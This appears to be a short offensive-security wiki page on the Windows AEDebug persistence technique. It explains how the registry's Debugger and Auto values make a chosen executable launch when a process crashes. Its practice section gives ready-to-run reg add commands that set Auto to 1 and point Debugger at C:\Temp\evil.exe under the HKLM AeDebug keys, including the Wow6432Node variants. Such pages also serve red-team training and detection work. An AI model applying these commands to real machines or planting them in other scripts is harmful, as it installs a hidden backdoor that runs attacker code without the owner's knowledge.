# AEDebug Keys Persistence

## Theory

**AEDebug Keys** is a persistence and backdoor technique that leverages the Windows registry's `Debugger` property to execute a specified executable when a process crashes. The level of access gained depends on the security context of the debugged process. Additionally, if the `Auto` property of the same registry key is set to `1`, the debugger launches automatically without requiring user interaction, further enhancing persistence.

{% hint style="info" %}
&#x20;A value of `C:\Windows\system32\vsjitdebugger.exe` might be seen if you have Visual Studio Community installed.
{% endhint %}

## Practice

{% hint style="danger" %}
By editing AEDebug, the original debugger exe will not start
{% endhint %}

{% tabs %}
{% tab title="AeDebug" %}
You can run a malicious code instead of the debugger by editing `Auto` and `Debugger` values under following keys:

* `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`
* `HKCU\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug`

```powershell
# Starts without user interaction
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ  /d "1"
# Edit debugger
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /d "C:\Temp\evil.exe"

#Or

# Starts without user interaction
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Auto" /t REG_SZ /d "1"
# Edit debugger
reg add "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\AeDebug" /v "Debugger" /d "C:\Temp\evil.exe"
```
{% endtab %}
{% endtabs %}

## Resources

{% embed url="https://www.hexacorn.com/blog/2013/09/19/beyond-good-ol-run-key-part-4/" %}

{% embed url="https://persistence-info.github.io/Data/aedebug.html" %}
